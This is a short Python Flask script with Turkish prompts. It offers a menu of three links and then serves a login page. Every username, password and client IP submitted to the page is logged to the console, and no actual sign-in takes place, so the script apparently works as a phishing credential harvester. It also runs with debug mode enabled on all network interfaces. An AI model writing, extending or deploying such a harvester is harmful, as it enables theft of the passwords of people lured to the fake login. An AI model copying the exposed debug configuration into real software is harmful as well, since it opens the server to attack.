import os
from flask import Flask, request, render_template

# Komut satırı arayüzü
print("Lütfen bir seçenek seçin:")
print("1. Seçenek 1")
print("2. Seçenek 2")
print("3. Seçenek 3")

choice = input("Seçiminiz (1/2/3): ")

# Seçime göre link oluşturma
if choice == '1':
    link = 'http://localhost:5000/option1'
elif choice == '2':
    link = 'http://localhost:5000/option2'
elif choice == '3':
    link = 'http://localhost:5000/option3'
else:
    print("Geçersiz seçim!")
    exit(1)

print(f"Oluşturulan link: {link}")

# Flask uygulaması
app = Flask(__name__)

@app.route('/<option>', methods=['GET', 'POST'])
def login(option):
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = request.remote_addr
        print(f"Kullanıcı Adı: {username}, Şifre: {password}, IP: {ip_address}")
        return "Giriş bilgileri alındı!"
    return render_template('login.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=True) 